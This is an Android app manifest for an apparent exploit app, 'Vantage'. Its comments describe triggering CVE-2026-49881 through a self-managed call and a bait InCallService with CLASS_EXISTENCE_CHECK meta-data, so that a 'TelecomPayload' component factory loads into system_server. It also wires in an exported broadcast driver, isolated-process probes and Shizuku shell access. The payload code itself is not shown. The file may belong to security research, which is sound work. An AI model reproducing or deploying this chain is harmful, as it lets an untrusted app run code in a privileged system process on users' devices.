<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- normal permission, granted at install: lets an untrusted app place a
         self-managed call, which is the CVE-2026-49881 trigger -->
    <uses-permission android:name="android.permission.MANAGE_OWN_CALLS" />
    <uses-permission android:name="moe.shizuku.manager.permission.API_V23" />

    <application
        android:label="Vantage"
        android:enableOnBackInvokedCallback="true"
        android:icon="@mipmap/ic_launcher"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:debuggable="true"
        android:allowBackup="false"
        android:theme="@style/Theme.DomainProbe"
        android:appComponentFactory="dev.pixelksu.domainprobe.TelecomPayload"
        tools:replace="android:appComponentFactory">

        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- headless driver: `am broadcast -a <pkg>.RUN` / `.TELECOM` -->
        <receiver android:name=".ProbeReceiver" android:exported="true">
            <intent-filter>
                <action android:name="dev.pixelksu.domainprobe.RUN" />
                <action android:name="dev.pixelksu.domainprobe.TELECOM" />
            </intent-filter>
        </receiver>

        <!-- isolatedProcess puts this in u:r:isolated_app:s0 -->
        <service
            android:name=".IsolatedProbeService"
            android:isolatedProcess="true"
            android:exported="false" />

        <!-- nativeService routes the isolated process through zygote_next on
             Android 17 (Demo's ZygoteNext technique) -->
        <service
            android:name=".NativeProbeService"
            android:isolatedProcess="true"
            android:nativeService="true"
            android:exported="false" />

        <!-- CVE-2026-49881 bait: the CLASS_EXISTENCE_CHECK meta-data makes
             InCallController run serviceClassExists() against this package and so
             load TelecomPayload into system_server -->
        <service android:name=".BaitInCallService"
            android:permission="android.permission.BIND_INCALL_SERVICE"
            android:exported="true">
            <meta-data android:name="android.telecom.CLASS_EXISTENCE_CHECK"
                android:value="true" />
            <intent-filter>
                <action android:name="android.telecom.InCallService" />
            </intent-filter>
        </service>

        <!-- returns a live self-managed connection so the call reaches RINGING
             and Telecom binds InCallServices (where the enumeration runs) -->
        <service android:name=".BaitConnectionService"
            android:permission="android.permission.BIND_TELECOM_CONNECTION_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.telecom.ConnectionService" />
            </intent-filter>
        </service>

        <!-- Shizuku: lets the app run the probe in the shell domain when Shizuku
             or Sui is installed and permission is granted. -->
        <provider
            android:name="rikka.shizuku.ShizukuProvider"
            android:authorities="${applicationId}.shizuku"
            android:multiprocess="false"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.INTERACT_ACROSS_USERS_FULL" />

        <provider
            android:name="androidx.core.content.FileProvider"
            android:authorities="${applicationId}.files"
            android:exported="false"
            android:grantUriPermissions="true">
            <meta-data android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/file_paths" />
        </provider>
    </application>
</manifest>
